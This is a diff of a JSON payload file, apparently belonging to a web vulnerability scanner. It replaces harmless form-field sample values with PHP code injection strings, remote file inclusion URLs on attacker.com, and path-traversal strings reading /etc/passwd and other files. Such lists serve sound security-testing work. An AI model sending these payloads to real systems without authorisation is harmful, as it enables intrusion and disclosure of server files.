@@ -1,23 +1,15 @@
 {
   "payloads": {
-    "week": "1996-W16", 
-    "search": "query", 
-    "checkbox": "true", 
-    "tel": "012345678", 
-    "month": "1996-12", 
-    "text": "abcdefgh", 
-    "number": "123456", 
-    "submit": "", 
-    "datetime": "1990-12-31T23:59:60Z", 
-    "url": "http://localhost/", 
-    "range": "1.23", 
-    "radio": "1", 
-    "time": "13:37:00", 
-    "date": "1996-12-19", 
-    "hidden": "Secret.", 
-    "password": "abcd1234", 
-    "email": "ex@amp.le", 
-    "color": "#FFFFFF", 
-    "datetime-local": "1985-04-12T23:20:50.52"
+    "PHP4": "echo \"afadsfaefasdfafezdfa\"", 
+    "PHP1": ";phpinfo()", 
+    "PHP2": "phpinfo()", 
+    "PHP3": ";echo \"afadsfaefasdfafezdfa\"", 
+    "RFI2": "http://attacker.com/a.js", 
+    "LFI1": "../../../../../../../../../../../../../../etc/passwd", 
+    "LFI3": "../../../../../../../../../../../../../lfi.php", 
+    "LFI2": "../../../../../../../../../../../../../../lfi.php", 
+    "RFI3": "http://attacker.com/a", 
+    "LFI4": "../../../../../../../../../../../../../../lfi", 
+    "RFI1": "http://attacker.com/a.php"
   }
 }
